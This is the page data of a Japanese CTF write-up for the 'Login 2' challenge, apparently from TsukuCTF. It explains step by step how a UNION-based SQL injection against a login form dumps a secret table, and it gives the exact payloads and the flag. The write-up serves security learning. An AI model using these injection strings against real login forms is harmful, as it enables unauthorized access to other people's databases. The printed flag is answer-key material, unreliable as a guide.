{
    "componentChunkName": "component---src-templates-writeups-js",
    "path": "/ctf/writeups/login2/writeup/",
    "result": {"data":{"site":{"siteMetadata":{"title":"SecHack365-Fans HomePage"}},"markdownRemark":{"id":"e299c459-3445-511e-82ef-59d630c511a4","excerpt":"Login 2 筑紫君が自分の会員制サイトを修正したんだって。でもどうやら何が問題だったのかわかっていないみたいですよ? https://tsukuctf.sechack365.com/problems/login2 ※ この問題では/problems/login2以下のみを用います。 他の問題/problems…","html":"<h1>Login 2</h1>\n<blockquote>\n<p>筑紫君が自分の会員制サイトを修正したんだって。でもどうやら何が問題だったのかわかっていないみたいですよ?</p>\n<p><a href=\"https://tsukuctf.sechack365.com/problems/login2\">https://tsukuctf.sechack365.com/problems/login2</a></p>\n<p>※ この問題では/problems/login2以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。</p>\n</blockquote>\n<p>Login 1 ~ 3がセットでSQL injectionの問題になっています。\nLogin2では、SQL injectionが可能な場所を見つけた後に、適切なInjectionによりデーターベース内の情報を探索することでflagを得ることができます。</p>\n<p>まずUsernameに<code class=\"language-text\">' or 1=1 ; --</code>を指定すると、図のようなログイン画面<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5f2627afe69ea4268e1388b846adb99f/d9ed5/login2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.835443037974684%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAACgElEQVQozwXBaU+SAQDA8cfV1mmX1lq1ppXNWmIlIFGJ1zq1gxCjwkw55RB4Hh4P5BIFH8EceKapXdairVarXviiXtRaH6Dv8+/3E6Key3Q7z+HyqjHbjtPaW8byhAnZpcPSdwp52MD7fA9Liplcoo2luAmf9zLBER3e6HmehKqxi+cwSnvoCO9D8LvOYw+q6ZPVBCQt8Xgj4wk9+dRtZLEdq0uHFL5KSDIwNXmT9YIbl6jDmz5NMlfPpzkzY+kmLJFDdA6UIdh8Gryhi3SJlYxEdBTzjxlN1vFh3oiSbkBKnWGu0EoqU4OS0/B20UhXbD/BVA0fFyz8W/eTyzVhi1ZjGzmN4JQa8EUMWEIHSA5qWc6aEOUKYkkVD4a2cl8uZ/FpM7PTzSST9RQyejrlXWTGL/B3xcPvNw7S2VZC8TruSeUIjn4djsELmEK7GR5WkYjr8YfLSKZUmKUd3HRuYyrWiDtYiSieJBfT44+qiE3UU1y8x4clI68XzExNt2AMb0ewdp/Eatdww7EXu/swM5PXcYfLGBYrMA2VkJjUsPHMwyNxJ33iEdKROoYm1MgjaiYSWtZn2vi6YkYpXGJgvB7BbVPh6dFi9R6l23WMmdQVAkNVKLFaHo9uYXW5lc+rLUjTJdjDW4kOnmVpzkJxvpdCRsfGWjeL082szt0im25HcAdq8XkNmByHcblr8fmrWM6381K5gykgEMlWElZK6VEEXLGDOBNVfCs6+fHewcK8gT+v+ngx00bxWQfPs50IFs8JrDYN+q7NyAEdnmANb5W7vIi3YOwvoTdZykN/Kdd8JQTzpTwc28TPL26+r9lIj2mZzRjYWH/Er3cBRlNa/gPUA4r17PLTYgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"login2\"\n        title=\"login2\"\n        src=\"/static/5f2627afe69ea4268e1388b846adb99f/f058b/login2.png\"\n        srcset=\"/static/5f2627afe69ea4268e1388b846adb99f/c26ae/login2.png 158w,\n/static/5f2627afe69ea4268e1388b846adb99f/6bdcf/login2.png 315w,\n/static/5f2627afe69ea4268e1388b846adb99f/f058b/login2.png 630w,\n/static/5f2627afe69ea4268e1388b846adb99f/40601/login2.png 945w,\n/static/5f2627afe69ea4268e1388b846adb99f/78612/login2.png 1260w,\n/static/5f2627afe69ea4268e1388b846adb99f/d9ed5/login2.png 2880w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span>が表示されます。どうやらここにSQLiができそうです。\n<code class=\"language-text\">UNION SELECT</code> で情報を抜くために、まずSELECT文のカラム数を特定します。\nUsernameとして <code class=\"language-text\">' union select null ; --</code>,  <code class=\"language-text\">' union select null, null ; --</code>,  <code class=\"language-text\">' union select null, null, null ; --</code>  …とnullの数を増やしていくと、nullが2個のときにログインに成功します。\nこれにて攻撃の準備は完了です。ここからは、データベース内を探索していきます。</p>\n<p>MySQL内のデータに関する情報は、<code class=\"language-text\">information_schema.columns</code>というテーブルに収納されています。まずは、ここの<code class=\"language-text\">table_name</code>というカラムを見るのが定石です。ということで、Usernameに</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">' UNION SELECT table_name, null FROM information_schema.columns; -- </code></pre></div>\n<p>を入力してログインすると、<code class=\"language-text\">super_secret_table</code>というテーブルがあることがわかります。多分flagはここでしょう。\n次に、カラム名を知るために、Usernameを</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'super_secret_table'; -- </code></pre></div>\n<p>としてログインします。すると、idとsecretというカラムがあることがわかります。\n最後に、</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">' UNION SELECT secret, null FROM super_secret_table; -- </code></pre></div>\n<p>とすればflagがゲットできます。</p>\n<div class=\"gatsby-highlight\" data-language=\"txt\"><pre class=\"language-txt\"><code class=\"language-txt\">TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}</code></pre></div>","frontmatter":{"title":"Login2","description":"union select  によるSQLi","author":"rikuta0811_dash","genre":"Web","solver":"21","point":"323"}}},"pageContext":{"id":"e299c459-3445-511e-82ef-59d630c511a4"}},
    "staticQueryHashes": ["2841359383"]}